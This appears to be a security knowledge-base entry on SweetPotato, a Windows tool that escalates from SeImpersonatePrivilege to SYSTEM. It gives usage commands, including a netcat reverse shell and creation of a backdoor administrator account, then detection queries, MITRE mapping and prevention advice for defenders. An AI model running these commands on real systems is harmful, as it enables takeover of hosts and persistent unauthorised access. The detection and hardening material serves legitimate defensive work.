name: SweetPotato - Multi-Technique Potato Privilege Escalation
description: SweetPotato combines multiple potato techniques into one tool: EfsPotato (EfsRpc), PrintSpoofer, and JuicyPotato techniques. Automatically selects the best technique for the target OS. Escalates from SeImpersonatePrivilege to SYSTEM on Windows Server 2008-2022.
notes:
=== TECHNIQUES ===
  -e EfsRpc     # EfsPotato - works on most modern Windows
  -e PrintSpoofer  # Uses print spooler named pipe
  -e JuicyPotato  # COM server abuse (older Windows)

=== USAGE ===
  # Execute command as SYSTEM:
  SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c whoami > C:\temp\out.txt"
  # Reverse shell:
  SweetPotato.exe -e EfsRpc -p C:\temp\nc.exe -a "-e cmd.exe <ip> <port>"
  # Add admin:
  SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user hacker Pass123! /add && net localgroup administrators hacker /add"

=== WHICH POTATO WHEN ===
  GodPotato:    All modern Windows. Most reliable.
  SweetPotato:  Multi-technique, auto-selects. Good backup.
  PrintSpoofer: If print spooler is running.
  JuicyPotato:  Older Windows (2008-2016). Needs CLSID.
  RoguePotato:  If outbound TCP is available.

recommended.note: GodPotato is newer and more reliable on modern Windows.

defense.why_it_works: Combines EfsPotato, PrintSpoofer, and JuicyPotato techniques to abuse SeImpersonatePrivilege via DCOM/named pipes/RPC coercion to impersonate SYSTEM tokens.
defense.prerequisites: Service account with SeImpersonatePrivilege; SweetPotato binary on target.
defense.impact: SYSTEM-level code execution from a service account.
defense.detection: [MITRE T1134.001] SweetPotato process creation; token impersonation; SYSTEM child process from service account.
defense.artifacts: SweetPotato.exe on disk; process tree showing service-to-SYSTEM escalation; named pipe creation.
defense.splunk_spl:
index=windows EventCode=4688 (NewProcessName="*SweetPotato*" OR CommandLine="*SweetPotato*")
| table _time, SubjectUserName, NewProcessName, CommandLine
defense.sentinel_kql:
DeviceProcessEvents
| where FileName has "SweetPotato" or ProcessCommandLine has "SweetPotato"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
defense.prevention: Remove SeImpersonatePrivilege from service accounts; use gMSA; EDR signatures for potato tools.

detections.name: SweetPotato privilege escalation
detections.logic:
DeviceProcessEvents
| where FileName has_any ("SweetPotato", "GodPotato", "JuicyPotato")
  or ProcessCommandLine has_any ("-e EfsRpc", "-e PrintSpoofer", "-e JuicyPotato")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
detections.tuning: Also detect by behavior: service account spawning SYSTEM child processes
